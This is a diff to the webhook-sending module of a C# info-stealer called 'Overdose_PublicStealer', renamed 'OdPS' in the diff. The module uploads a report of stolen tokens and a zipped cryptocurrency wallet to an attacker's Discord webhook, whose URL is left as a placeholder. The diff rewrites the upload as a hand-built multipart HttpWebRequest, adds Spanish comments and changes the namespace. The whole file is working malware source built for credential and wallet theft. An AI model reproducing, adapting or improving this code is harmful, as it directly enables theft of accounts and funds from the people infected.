@@ -1,19 +1,20 @@
-﻿using System;
+using System;
 using System.Collections.Generic;
 using System.IO;
 using System.Linq;
-using System.Net.Http;
-using System.Text.Json;
+using System.Net; // Necesario para HttpWebRequest
+using System.Text; // Necesario para Encoding
+using System.Text.Json; // Para serializar el JSON
 using System.Threading.Tasks;
-using Overdose_PublicStealer.Utils;
-using Overdose_PublicStealer.Models; // Import models for the webhook structure
+using OdPS.Utils;
+using OdPS.Models; // Import models for the webhook structure
 
-namespace Overdose_PublicStealer
+namespace OdPS
 {
     internal static class WebhookSender
     {
         // Webhook URL where data will be sent. Make sure to replace this with your own webhook URL.
-        private static readonly string webhookUrl = "HERE UR WEBHOOK";
+        private static readonly string webhookUrl = "HERE_UR_WEBHOOK";
 
         /// <summary>
         /// Sends a combined report including stolen tokens, wallet zip
@@ -107,61 +108,102 @@ namespace Overdose_PublicStealer
             // Serialize the payload object into JSON format
             var jsonPayload = JsonSerializer.Serialize(payload, new JsonSerializerOptions { WriteIndented = false }); // No indentation for smaller payload
 
-            // Use HttpClient to send the request
-            using (var client = new HttpClient())
-            using (var formData = new MultipartFormDataContent())
+            // --- Inicio de la implementación con HttpWebRequest ---
+
+            // Genera un límite único para el formulario multipart
+            string boundary = "---------------------------" + DateTime.Now.Ticks.ToString("x");
+            byte[] boundaryBytes = Encoding.UTF8.GetBytes("\r\n--" + boundary + "\r\n");
+            byte[] finalBoundaryBytes = Encoding.UTF8.GetBytes("\r\n--" + boundary + "--\r\n");
+
+            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(webhookUrl);
+            request.Method = "POST";
+            request.ContentType = "multipart/form-data; boundary=" + boundary;
+            request.KeepAlive = true; // Mantener la conexión abierta
+
+            try
             {
-                // Add the JSON payload as a StringContent
-                // The name "payload_json" is required by Discord for the JSON payload
-                formData.Add(new StringContent(jsonPayload, System.Text.Encoding.UTF8, "application/json"), "payload_json");
-
-                // Add the wallet zip file as a StreamContent if it exists
-                if (!string.IsNullOrEmpty(walletZipPath) && File.Exists(walletZipPath))
+                using (var requestStream = await request.GetRequestStreamAsync())
                 {
-                    try
-                    {
-                        var fileStream = File.OpenRead(walletZipPath);
-                        // Use a distinct name for the wallet file attachment
-                        formData.Add(new StreamContent(fileStream), "wallet_file", Path.GetFileName(walletZipPath));
-                        Console.WriteLine($"Attaching wallet file: {Path.GetFileName(walletZipPath)}");
-                    }
-                    catch (Exception ex)
-                    {
-                        Console.WriteLine($"Error reading wallet zip file for attachment: {ex.Message}");
-                        // Continue sending the embed and other files even if this one fails
-                    }
-                }
+                    // 1. Añadir la parte JSON (payload_json)
+                    await requestStream.WriteAsync(boundaryBytes, 0, boundaryBytes.Length);
+                    string jsonHeader = $"Content-Disposition: form-data; name=\"payload_json\"\r\nContent-Type: application/json; charset=utf-8\r\n\r\n";
+                    byte[] jsonHeaderBytes = Encoding.UTF8.GetBytes(jsonHeader);
+                    await requestStream.WriteAsync(jsonHeaderBytes, 0, jsonHeaderBytes.Length);
 
-                try
+                    byte[] jsonContentBytes = Encoding.UTF8.GetBytes(jsonPayload);
+                    await requestStream.WriteAsync(jsonContentBytes, 0, jsonContentBytes.Length);
+
+                    // 2. Añadir el archivo si existe (wallet_file)
+                    if (!string.IsNullOrEmpty(walletZipPath) && File.Exists(walletZipPath))
+                    {
+                        try
+                        {
+                            Console.WriteLine($"Attaching wallet file: {Path.GetFileName(walletZipPath)}");
+
+                            await requestStream.WriteAsync(boundaryBytes, 0, boundaryBytes.Length);
+                            string fileHeader = $"Content-Disposition: form-data; name=\"wallet_file\"; filename=\"{Path.GetFileName(walletZipPath)}\"\r\nContent-Type: application/octet-stream\r\n\r\n";
+                            byte[] fileHeaderBytes = Encoding.UTF8.GetBytes(fileHeader);
+                            await requestStream.WriteAsync(fileHeaderBytes, 0, fileHeaderBytes.Length);
+
+                            // Escribir el contenido del archivo
+                            using (var fileStream = File.OpenRead(walletZipPath))
+                            {
+                                await fileStream.CopyToAsync(requestStream);
+                            }
+                        }
+                        catch (Exception ex)
+                        {
+                            Console.WriteLine($"Error reading wallet zip file for attachment: {ex.Message}");
+                            // No lanzar la excepción, continuar para intentar enviar el webhook sin el archivo
+                        }
+                    }
+
+                    // 3. Añadir el límite final del formulario multipart
+                    await requestStream.WriteAsync(finalBoundaryBytes, 0, finalBoundaryBytes.Length);
+                } // El requestStream se cierra y se vacía (flush) automáticamente al salir del using
+
+                // Obtener la respuesta de forma asíncrona
+                using (WebResponse response = await request.GetResponseAsync())
                 {
-                    // Send the POST request asynchronously to the webhook URL
-                    var response = await client.PostAsync(webhookUrl, formData);
-
-                    // Check if the request was successful (status code 2xx)
-                    if (response.IsSuccessStatusCode)
+                    HttpWebResponse httpResponse = (HttpWebResponse)response;
+                    if (httpResponse.StatusCode == HttpStatusCode.OK || httpResponse.StatusCode == HttpStatusCode.NoContent)
                     {
                         Console.WriteLine("Combined webhook sent successfully.");
                     }
                     else
                     {
-                        // Read the response body for error details from Discord API
-                        string responseBody = await response.Content.ReadAsStringAsync();
-                        Console.WriteLine($"Error sending combined webhook: {response.StatusCode} - {responseBody}");
+                        // Leer el cuerpo de la respuesta en caso de error
+                        using (StreamReader reader = new StreamReader(response.GetResponseStream()))
+                        {
+                            string responseBody = await reader.ReadToEndAsync();
+                            Console.WriteLine($"Error sending combined webhook: {httpResponse.StatusCode} - {responseBody}");
+                        }
                     }
                 }
-                catch (Exception ex)
+            }
+            catch (WebException ex)
+            {
+                // Manejar errores de red o del servidor
+                Console.WriteLine($"Error de red al enviar webhook: {ex.Status} - {ex.Message}");
+                if (ex.Response != null)
                 {
-                    // If an error occurs during the HTTP request itself (e.g., network issue)
-                    Console.WriteLine($"Error posting combined webhook: {ex.Message}");
+                    using (StreamReader reader = new StreamReader(ex.Response.GetResponseStream()))
+                    {
+                        string errorResponse = await reader.ReadToEndAsync();
+                        Console.WriteLine($"Detalles del error del servidor: {errorResponse}");
+                    }
                 }
             }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"Error inesperado al enviar webhook: {ex.Message}");
+            }
+            // --- Fin de la implementación con HttpWebRequest ---
         }
-
-        // Removed SendFileReport method
 
         // Note: The helper classes (WebhookPayload, Embed, EmbedField, EmbedFooter, EmbedImage, EmbedAuthor, EmbedThumbnail)
         // and NetworkUtils are assumed to be defined in separate files (e.g., Models.cs and Utils.cs)
-        // within the Overdose_PublicStealer.Models and Overdose_PublicStealer.Utils namespaces, respectively,
+        // within the OdPS.Models and OdPS.Utils namespaces, respectively,
         // as indicated by the using directives.
         // You will need to ensure EmbedAuthor and EmbedThumbnail classes are in your Models.cs file.
     }
